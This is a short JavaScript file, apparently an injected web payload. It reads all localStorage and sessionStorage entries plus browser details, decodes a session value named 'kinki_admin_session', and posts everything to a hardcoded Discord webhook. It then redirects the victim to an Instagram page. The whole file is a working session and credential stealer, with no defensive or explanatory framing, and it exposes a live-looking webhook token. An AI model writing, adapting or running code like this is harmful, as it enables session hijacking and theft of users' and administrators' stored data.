function sendWithRetry(data, maxRetries = 3) {
    const retryDelay = (attempt) => Math.pow(2, attempt) * 1000;

    function attemptSend(retryCount) {
        fetch('https://discord.com/api/webhooks/1519556098632450099/uFPBrLhv-YRSrPr3Yg8K-lioL7UEK7gSEiWIGPfi7Dxbxvmn8k6mbIZjvYKECNfwd5P8', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: data,
                    username: "xd",
                    avatar_url: "https://i.imgur.com/4M34hi2.png"
                })
            })
            .then(response => {
                if (!response.ok && retryCount < maxRetries) {
                    setTimeout(() => attemptSend(retryCount + 1), retryDelay(retryCount));
                } else if (!response.ok) {
                    console.error("xdn't");
                }
            })
            .catch(error => {
                if (retryCount < maxRetries) {
                    setTimeout(() => attemptSend(retryCount + 1), retryDelay(retryCount));
                } else {
                    console.error("xdred:", error);
                }
            });
    }
    attemptSend(0);
}

const localStorageArray = Object.keys(localStorage).map(key => ({
    key,
    value: localStorage.getItem(key)
}));

const sessionStorageArray = Object.keys(sessionStorage).map(key => ({
    key,
    value: sessionStorage.getItem(key)
}));

const userInfo = {
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString(),
    platform: navigator.platform
};

const userId = sessionStorage.getItem('kinki_admin_session')

const payload = {
    "clean (atob)": atob(userId),
    SesionStorage: sessionStorageArray,
    Storage: localStorageArray,
    userInfo: userInfo
};

sendWithRetry("```\n" + JSON.stringify(payload, null, 2) + "\n```");

setTimeout(() => {
    window.location.href = 'https://instagram.com/jo_guzman_soto';
}, 2000);
